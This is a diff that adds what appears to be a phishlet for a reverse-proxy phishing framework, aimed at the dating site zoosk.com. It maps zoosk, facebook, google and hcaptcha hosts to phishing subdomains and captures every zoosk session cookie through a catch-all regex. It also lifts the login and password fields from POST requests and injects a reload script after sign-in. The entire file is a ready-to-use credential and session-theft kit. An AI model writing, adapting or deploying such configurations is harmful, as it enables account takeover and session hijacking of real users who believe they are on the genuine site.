@@ -1,0 +1,56 @@
+name: 'ot'
+author: 'tare'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'zoosk.com', session: true, is_landing: true }
+  - {phish_sub: 'wsws', orig_sub: 'Www', domain: 'facebook.com', session: true, is_landing: false }
+  - {phish_sub: 'static3', orig_sub: 'static3', domain: 'zoosk.com', session: true, is_landing: false }
+  - {phish_sub: 'analytics', orig_sub: 'analytics', domain: 'google.com', session: true, is_landing: false }
+  - {phish_sub: 'newassets', orig_sub: 'newassets', domain: 'hcaptcha.com', session: true, is_landing: false }
+  - {phish_sub: 'api2', orig_sub: 'api2', domain: 'hcaptcha.com', session: true, is_landing: false }
+  - {phish_sub: 'imgs3', orig_sub: 'imgs3', domain: 'hcaptcha.com', session: true, is_landing: false }
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'hcaptcha.com', session: true, is_landing: false }
+
+sub_filters:
+  - {triggers_on: 'zoosk.com', orig_sub: 'www', domain: 'zoosk.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'zoosk.com', orig_sub: 'api', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'zoosk.com', orig_sub: 'imgs3', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'zoosk.com', orig_sub: 'newassets', domain: 'hcaptcha.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'zoosk.com', orig_sub: 'static3', domain: 'zoosk.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+auth_urls:
+  - '/personals'
+  - '/personals/search/0/about'
+
+auth_tokens:
+  - domain: 'www.zoosk.com'
+    keys: ['.*,regexp']
+  - domain: '.zoosk.com'
+    keys: ['.*,regexp']
+    
+credentials:
+  username:
+    key: 'login'
+    search: '([^"]*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '([^"]*)'
+    type: 'post'
+    
+login:
+  domain: 'www.zoosk.com'
+  path: '/login/email'
+  
+js_inject:
+  - trigger_domains: ["www.zoosk.com"]
+    trigger_paths: ["/home"]
+    script: |
+      function gimmesleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redir() {
+        await gimmesleep(2000);
+        location.reload(true);
+      }
+      redir()
